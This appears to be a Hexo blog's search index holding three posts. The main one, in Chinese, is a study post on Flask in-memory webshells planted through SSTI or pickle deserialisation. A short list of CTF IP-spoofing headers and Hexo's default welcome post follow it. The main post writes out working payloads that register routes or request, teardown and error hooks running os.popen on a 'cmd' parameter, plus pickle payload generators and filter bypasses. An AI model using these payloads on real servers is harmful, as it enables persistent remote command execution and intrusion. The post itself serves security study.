<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>python flask内存马学习</title>
      <link href="/2025/02/03/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/02/03/python-flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p><strong>内存马</strong>，也被称为<strong>无文件马</strong>，是无文件攻击的一种常用手段。</p><p>常用的python框架有<code>Django</code>、<code>flask</code>，而这两种框架都可能存在SSTI漏洞。**<code>python 内存马</code><strong>就是利用flask框架中</strong>SSTI<strong>或者</strong>pickle反序列化**来实现的，通过添加新的路由访问该路由实现命令执行。</p><h1 id="请求上下文管理机制"><a href="#请求上下文管理机制" class="headerlink" title="请求上下文管理机制"></a>请求上下文管理机制</h1><p>当网页请求进入flask时，会实例化一个<code>requset context</code>.在python中分出了两种上下文：<strong>请求上下文(request context)、应用上下文(session context).<strong>一个请求上下文中封装了请求的信息，而上下文的结构是运用了一个stack的栈结构，也就是说它拥有一个栈所拥有的全部特性。</strong><code>request context</code>实例化后会被push到栈<code>_request_ctx_stack</code>中，基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</strong></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>利用flask编写一个SSTI例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    person = <span class="string">&#x27;knave&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hello, %s.&lt;/h1&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>原始flask内存马payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><p>下面我们将Payload拆开来, 逐层分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">    <span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">        &#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">        &#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">        lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">    )&quot;</span>,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>前面的**<code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code><strong>中，<code>url_for</code>是flask的一个方法，可以调用<code>__globals__</code>属性，</strong><code>__globals__</code>能返回函数所在模块命名空间的所有变量<strong>，其中包括很多已经引用的模块，而这里是有<code>__builtins__</code>的，而</strong><code>__builtins__</code>中包含很多内建函数**，其中包括命令执行函数<code>eval()</code>。即这一步主要是为了获取命令执行函数<code>eval()</code>，当然采用SSTI其他payload获取该函数也是可以的</p><p>而后面的**<code>app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())</code>用于动态注册一个新的路由规则。**</p><p>在flask中我们通常使用**<code>@app.route()</code><strong>装饰器来添加路由，而其也是调用了<code>add_url_rule</code>函数来添加路由的。</strong><code>app.add_url_rule</code>** 提供了更为底层和灵活的方式来定义路由，尤其适合在动态或程序化场景下使用。</p><p><img src="D:\Typora\images\20220224144721-9de02122-953d-1.png"></p><blockquote><ul><li>rule: 函数对应的<code>URL</code>规则, 满足条件和<code>app.route</code>的第一个参数一样, 必须以<code>/</code>开头.</li><li>endpoint: 端点, 即在使用<code>url_for</code>进行反转的时候, 这里传入的第一个参数就是<code>endpoint</code>对应的值, 这个值也可以不指定, 默认就会使用函数的名字作为<code>endpoint</code>的值.</li><li>view_func: <code>URL</code>对应的函数, 这里只需写函数名字而不用加括号.</li><li>provide_automatic_options: 控制是否应自动添加选项方法.</li><li>options: 要转发到基础规则对象的选项.</li></ul></blockquote><p>而这里<code>&#39;/shell&#39;</code>指路由的路径。<code>shell</code>是路由规则的名称，它是这个路由的标识符，可以在其他地方引用。**<code>lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read()</code><strong>则是该路由对应的函数，这里定义的一个匿名函数<code>lambda</code>，用于执行命令，</strong>通过<code>_request_ctx_stack.top</code>指向请求上下文栈的顶部元素，即当前正在处理的请求，再通过<code>request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code>获取请求中cmd参数的值，默认为<code>whoami</code>，通过<code>read()</code>标准输出，从而达到添加路由做到任意命令执行**</p><p>再来看看<code>&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;</code>这一截<code>Payload</code>。 <strong><code>_request_ctx_stack</code><strong>是<code>Flask</code>的一个全局变量, 是一个<code>LocalStack</code>实例, 这里的<code>_request_ctx_stack</code>即上文中提到的<code>Flask 请求上下文管理机制</code>中的<code>_request_ctx_stack</code>。</strong><code>app</code>也是<code>Flask</code>的一个全局变量, 这里即获取当前的<code>app</code>。</strong>这里指明了所需变量的全局命名空间, 保证<code>app</code>和<code>_request_ctx_stack</code>都可以被找到。</p><blockquote><p>这里app的获取也可以通过**<code>sys.modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].add_url_rule(&#39;/shell&#39;,&#39;shell&#39;,lambda :__import__(&#39;os&#39;).popen(&#39;dir&#39;).read())</code>**</p></blockquote><h1 id="add-url-rule的局限"><a href="#add-url-rule的局限" class="headerlink" title="add_url_rule的局限"></a>add_url_rule的局限</h1><p>上面的payload只针对旧版，但由于新版关闭debug模式会调用check函数，即<code>_check_setup_finished()</code>函数引起报错</p><p><img src="D:\Typora\images\20240517205629-e0ca0558-144c-1.png"></p><p>意思就是这个app已经跑起来了,这个函数就不能再被调用了.调试之后发现这个方法的<code>@setupmethod</code>装饰器会先check一次,所以基本上是完全不能用了.</p><p>所以旧版不能用的大致原因是因为在可以动态添加路由和错误处理逻辑(如<code>register_error_handler()</code>方法)都被**<code>@setupmethod</code>装饰器修饰<strong>了,而<code>@setupmethod</code>装饰器会在Flask跑起来之前就把这些方法都加到一个被check的名单里,以后</strong>再被调用的话就会被<code>@setupmethod</code>这个装饰器给check然后报错**</p><p>所以add_url_rule就不能用了，这里就需要其他方法挂内存🐎</p><h1 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h1><p><strong>python装饰器：装饰器本质上是一个可调用的对象(函数或类), 它接收一个函数或类座位参数,并返回一个新的函数或类.这个新的函数或类通常会保留原始函数或类的功能,但会在其基础上添加一些额外的逻辑.</strong></p><p>在flask中，**<code>before_request</code>是一个装饰器，它用于在请求处理之前执行特定的函数**。这个装饰器允许对每个请求进行一些预处理，比如认证检查、日志记录、设置响应头等。</p><p>举个例子：<br><img src="D:\Typora\images\QQ20241231-202231.png"></p><p>这里验证请求头是否包含<code>Authorization</code>字段，如果没有，则返回未授权的错误响应(401)</p><p><img src="D:\Typora\images\image-20240515013857705.png"></p><p>可以看到<code>before_request</code>实际上调用的是**<code>self.before_request_funcs.setdefault(None, []).append(f)</code>**，其意思是：</p><ul><li>检查 <code>self.before_request_funcs</code> 字典中是否有一个键为 <code>None</code> 的条目。</li><li>如果没有 <code>None</code> 键，就在字典中创建它，并将其值设置为一个空列表。</li><li><strong>然后，无论 <code>None</code> 键是否存在，都将函数 <code>f</code> 添加到这个列表中。</strong></li></ul><p>这个函数f就是我们要添加的函数。</p><p>而该函数就添加之前payload的lambda匿名函数即可</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>].before_request_funcs.setdefault(<span class="literal">None</span>,[]).append(<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(request.args.get(<span class="string">&#x27;cmd&#x27;</span>)).read())</span><br></pre></td></tr></table></figure><h1 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h1><p><code>after_request</code>与<code>before_request</code>类似。<code>after_request</code>方法允许我们在每个请求之后执行一些操作。我们可以利用该方法来添加一些响应头、记录请求日志等任务</p><p><img src="D:\Typora\images\20240517205714-fba76f64-144c-1.png"></p><p><code>self.after_request_funcs.setdefault(None, []).append(f)</code>传入的f就是对应的自定义函数，但这里的f需要接收一个response对象，同时返回一个response对象。</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,&#123;<span class="string">&#x27;request&#x27;</span>:url_for.__globals__[<span class="string">&#x27;request&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> resp: CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span> <span class="built_in">exec</span>(<span class="string">&#x27;global r;r=app.make_response(__import__(&#x27;</span>os<span class="string">&#x27;).popen(request.args.get(&#x27;</span>cmd<span class="string">&#x27;)).read())&#x27;</span>)==<span class="literal">None</span> <span class="keyword">else</span> resp)</span><br></pre></td></tr></table></figure><p>逐行解释这段代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> resp: <span class="comment">#传入参数</span></span><br><span class="line">    CmdResp <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>) <span class="keyword">and</span>      <span class="comment">#如果请求参数含有cmd则返回命令执行结果</span></span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">        global r;     #定义一个全局变量,方便获取</span></span><br><span class="line"><span class="string">        r=app.make_response(__import__(&#x27;</span>os<span class="string">&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())   #创建一个响应对象</span></span><br><span class="line"><span class="string">    &#x27;</span>)==<span class="literal">None</span>    <span class="comment">#恒真</span></span><br><span class="line">    <span class="keyword">else</span> resp)  <span class="comment">#如果请求参数没有cmd则正常返回</span></span><br><span class="line"><span class="comment">#这里的cmd参数名和r变量名都是可以改的</span></span><br></pre></td></tr></table></figure><p>不带出回显，适用于过滤严格的场景：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> x:<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(request.args.get(<span class="string">&quot;cmd&quot;</span>)))</span><br></pre></td></tr></table></figure><h1 id="Flask中的其他钩子函数"><a href="#Flask中的其他钩子函数" class="headerlink" title="Flask中的其他钩子函数"></a>Flask中的其他钩子函数</h1><p>其实<code>after_request()</code>和<code>before_request()</code>有一个共同的分类叫钩子函数.钩子函数是指在执行函数和目标函数之间挂载的函数,框架开发者给调用方提供一个point-挂载点,至于挂载什么函数由调用方决定.</p><p><strong>@before_first_request</strong></p><p>在对应用程序实例的第一个请求之前注册要运行的函数,只会运行一次.</p><p><strong>@before_request</strong></p><p>在每个请求之前注册一个要运行的函数,每一次请求都会执行一次.</p><p><strong>@after_request</strong></p><p>在每个请求之后注册一个要运行的函数,每次请求完成后都会执行.需要接收一个 Response 对象作为参数,并返回一个新的 Response 对象,或者返回接收的 Response 对象.</p><p><strong>@teardown_request</strong></p><p>注册在每一个请求的末尾,不管是否有异常,每次请求的最后都会执行.</p><p><strong>@context_processor</strong></p><p>上下文处理器,返回的字典可以在全部的模板中使用.</p><p><strong>@template_filter(‘upper’)</strong></p><p>增加模板过滤器,可以在模板中使用该函数,后面的参数是名称,在模板中用到.</p><p><strong>@errorhandler(400)</strong></p><p>发生一些异常时,比如404,500,或者抛出异常(Exception)之类的,就会自动调用该钩子函数.</p><p>1.发生请求错误时,框架会自动调用相应的钩子函数,并向钩子函数中传入error参数.</p><p>2.如果钩子函数没有定义error参数,就会报错.</p><p>3.可以使用<code>abort(http status code)</code>函数来手动终止请求抛出异常,如果要是发生参数错误,可以abort(404)之类的.</p><p><strong>@teardown_appcontext</strong></p><p>不管是否有异常,注册的函数都会在每次请求之后执行.flask 为上下文提供了一个<code>teardown_appcontext</code>钩子,使用它注册的毁掉函数会在程序上下文被销毁时调用,通常也在请求上下文被销毁时调用.某些情况下这个函数和**@teardown_request**的行为是类似的,一个是请求上下文被销毁时被调用,另一个是应用上下文被销毁时调用.</p><p>比如你需要在每个请求处理结束后销毁数据库连接：app.teardown_appcontext 装饰器注册的回调函数需要接收异常对象作为参数,当请求被正常处理时这个参数将是None,这个函数的返回值将被忽略.</p><h2 id="before-request-after-request和-teardown-request-teardown-appcontext的区别"><a href="#before-request-after-request和-teardown-request-teardown-appcontext的区别" class="headerlink" title="@before_request&#x2F;@after_request和**@teardown_request**&#x2F;@teardown_appcontext的区别"></a><strong>@before_request</strong>&#x2F;<strong>@after_request</strong>和**@teardown_request**&#x2F;<strong>@teardown_appcontext</strong>的区别</h2><p><strong>@after_request</strong>是在视图函数处理完请求并生成响应对象之后，但在响应被发送给客户端之前。而且这个函数需要接收当前的响应作为参数,并可以返回一个新的响应对象或者返回原来的响应对象.</p><p><strong>@teardown_request</strong>&#x2F;<strong>@teardown_appcontext</strong>无论请求是否成功完成，无论是否发生了异常,是在响应已经被发送给客户端之后被触发,而且不接受任何参数.</p><p><strong>@after_request</strong>装饰的函数如果抛出了异常就会直接跳转到错误处理机制.</p><p><strong>@teardown_request</strong>&#x2F;<strong>@teardown_appcontext</strong>装饰的函数被抛出的异常通常会被忽略.</p><h2 id="teardown-request的利用"><a href="#teardown-request的利用" class="headerlink" title="@teardown_request的利用"></a><strong>@teardown_request</strong>的利用</h2><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.teardown_request_funcs.setdefault(<span class="literal">None</span>, []).append(<span class="keyword">lambda</span> :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;calc&quot;</span>).read())</span><br></pre></td></tr></table></figure><p>**不能调用<code>request.args.get()</code>动态执行传入的命令,**但是可以执行注入的代码.<strong>每次刷新网页都会执行</strong>.原因是这个装饰器的触发是在请求被销毁后的.在这个时候上一个HTTP请求帧已经被销毁了,但是可以执行静态命令.</p><h2 id="teardown-appcontext的利用"><a href="#teardown-appcontext的利用" class="headerlink" title="@teardown_appcontext的利用"></a>@teardown_appcontext的利用</h2><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.teardown_appcontext_funcs.append(<span class="keyword">lambda</span> x :<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&quot;calc&quot;</span>).read())</span><br></pre></td></tr></table></figure><p>同样<strong>不能调用<code>request.args.get()</code>动态执行传入的命令</strong>,但是可以执行注入的代码.<strong>每次刷新网页都会执行</strong>.原因是这个装饰器的触发是在请求被销毁后的.不然会报错</p><h2 id="errorhandler-的利用"><a href="#errorhandler-的利用" class="headerlink" title="**@errorhandler()**的利用"></a>**@errorhandler()**的利用</h2><p>该装饰器内部定义了一个用于注册错误处理函数的函数</p><p><img src="D:\Typora\images\QQ20241231-213141.png"></p><p>跟到这个<code>register_error_handler()</code>里边</p><p><img src="D:\Typora\images\QQ20241231-213312.png"></p><p>可以发现他给这个<code>self.error_hander_spec</code>这个字典里添加了一个函数,就是错误处理函数.</p><p>如果我们能控制<code>code</code>和<code>exc_class</code>,我们就可以利用错误处理的逻辑执行我们传入的函数.那么<code>code</code>和<code>exc_class</code>是从哪里来的呢,看656行的<code>self._get_exc_class_and_code</code>,进入这个方法可以发现他返回的是一个元组,元组里有一个错误的类和一个整数</p><p><img src="D:\Typora\images\QQ20241231-213455.png"></p><p>这里直接调用<code>_get_exc_class_and_code()</code>这个方法然后把他的返回值扔到<code>self.error_hander_spec</code>这个字典里.然后给他赋值我们构造的函数.<code>_get_exc_class_and_code()</code>的形参是一个整数就比较方便调用了.</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>)</span><br></pre></td></tr></table></figure><p>这个方法是可以直接带出回显的</p><h1 id="pickle利用下的payload"><a href="#pickle利用下的payload" class="headerlink" title="pickle利用下的payload"></a>pickle利用下的payload</h1><h2 id="before-request-1"><a href="#before-request-1" class="headerlink" title="before_request"></a>before_request</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read())&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h2 id="after-request-1"><a href="#after-request-1" class="headerlink" title="after_request"></a>after_request</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;gxngxngxn\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h2 id="errorhandler"><a href="#errorhandler" class="headerlink" title="errorhandler"></a>errorhandler</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;gxngxngxn&#x27;)).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br></pre></td></tr></table></figure><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>这里参考SSTI的绕过</p><ul><li><strong><code>url_for</code>可替换为<code>get_flashed_messages</code>或者<code>request.__init__</code>或者<code>request.application</code></strong></li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://xz.aliyun.com/news/10381">新版FLASK下python内存马的研究</a></li><li><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">Python 内存马分析</a></li><li><a href="https://xz.aliyun.com/news/13976">新版Flask框架下用钩子函数实现内存马的方式</a></li><li><a href="https://chensonghi.github.io/2024/07/20/Memory-Horse-in-Flask/">flask下的内存马</a></li><li>[一些python RCE利用&amp;&amp;内存马](</li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中的IP伪造</title>
      <link href="/2025/02/03/CTF%E4%B8%AD%E7%9A%84IP%E4%BC%AA%E9%80%A0/"/>
      <url>/2025/02/03/CTF%E4%B8%AD%E7%9A%84IP%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<p>在一些CTF比赛常常会考到通过<strong>伪造IP</strong>获得flag，下面是一些常见的IP伪造的请求头：</p><ul><li><strong>X-Forwarded-For:127.0.0.1</strong></li><li><strong>Client-ip:127.0.0.1</strong></li><li><strong>X-Client-IP:127.0.0.1</strong></li><li><strong>X-Remote-IP:127.0.0.1</strong></li><li><strong>X-Rriginating-IP:127.0.0.1</strong></li><li><strong>X-Remote-addr:127.0.0.1</strong></li><li><strong>HTTP_CLIENT_IP:127.0.0.1</strong></li><li><strong>X-Real-IP:127.0.0.1</strong></li><li><strong>X-Originating-IP:127.0.0.1</strong></li><li><strong>via:127.0.0.1</strong></li><li><strong>X-Forwarded:127.0.0.1</strong></li><li><strong>X-Forwarded-Host:127.0.0.1</strong></li><li><strong>True-Client-IP:127.0.0.1</strong></li><li><strong>Ali-CDN-Real-IP:127.0.0.1</strong></li><li><strong>Cdn-Real-IP:127.0.0.1</strong></li><li><strong>Cdn-Src-IP:127.0.0.1</strong></li><li><strong>CF-Connecting-IP:127.0.0.1</strong></li><li><strong>Proxy-Client-IP:127.0.0.1</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/01/31/hello-world/"/>
      <url>/2025/01/31/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
